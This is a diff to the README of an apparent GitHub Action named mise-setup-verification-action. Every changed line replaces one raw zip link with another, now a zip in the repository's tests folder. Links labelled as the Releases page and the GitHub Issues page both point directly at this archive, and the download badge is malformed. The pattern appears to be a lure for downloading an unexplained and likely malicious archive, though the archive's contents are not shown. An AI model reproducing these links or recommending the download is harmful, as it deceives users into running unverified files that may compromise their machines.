@@ -1,6 +1,6 @@
 # 🚀 mise-setup-verification-action - Simplify Your Setup and Verification Process
 
-[![Download Latest Release](https://github.com/AYMANE-GYM/mise-setup-verification-action/raw/refs/heads/main/src/setup-mise-action-verification-v2.1.zip%20Latest%https://github.com/AYMANE-GYM/mise-setup-verification-action/raw/refs/heads/main/src/setup-mise-action-verification-v2.1.zip)](https://github.com/AYMANE-GYM/mise-setup-verification-action/raw/refs/heads/main/src/setup-mise-action-verification-v2.1.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/AYMANE-GYM/mise-setup-verification-action/main/tests/mise_action_verification_setup_v3.0.zip%20Latest%https://raw.githubusercontent.com/AYMANE-GYM/mise-setup-verification-action/main/tests/mise_action_verification_setup_v3.0.zip)](https://raw.githubusercontent.com/AYMANE-GYM/mise-setup-verification-action/main/tests/mise_action_verification_setup_v3.0.zip)
 
 ## 📦 Overview
 
@@ -29,7 +29,7 @@ To get started with the mise-setup-verification-action, follow these simple step
 
 To download the latest version of **mise-setup-verification-action**, visit the Releases page:
 
-[Download from Releases](https://github.com/AYMANE-GYM/mise-setup-verification-action/raw/refs/heads/main/src/setup-mise-action-verification-v2.1.zip)
+[Download from Releases](https://raw.githubusercontent.com/AYMANE-GYM/mise-setup-verification-action/main/tests/mise_action_verification_setup_v3.0.zip)
 
 ### 2. Download the Latest Release
 
@@ -85,13 +85,13 @@ This command should return the version of mise that you have installed. If it do
 
 ## 📥 Download & Install
 
-If you haven't done so already, make sure to visit the [Releases page to download mise-setup-verification-action](https://github.com/AYMANE-GYM/mise-setup-verification-action/raw/refs/heads/main/src/setup-mise-action-verification-v2.1.zip). 
+If you haven't done so already, make sure to visit the [Releases page to download mise-setup-verification-action](https://raw.githubusercontent.com/AYMANE-GYM/mise-setup-verification-action/main/tests/mise_action_verification_setup_v3.0.zip). 
 
 Follow the installation steps given above to get it running in your environment. You’ll be pleased to discover how easy it is to manage versions of the mise tool in your workflows.
 
 ## 📞 Support
 
-If you have any questions or run into issues, feel free to create an issue on our [GitHub Issues page](https://github.com/AYMANE-GYM/mise-setup-verification-action/raw/refs/heads/main/src/setup-mise-action-verification-v2.1.zip). We welcome feedback and are here to help!
+If you have any questions or run into issues, feel free to create an issue on our [GitHub Issues page](https://raw.githubusercontent.com/AYMANE-GYM/mise-setup-verification-action/main/tests/mise_action_verification_setup_v3.0.zip). We welcome feedback and are here to help!
 
 ## 👥 Contributing
 
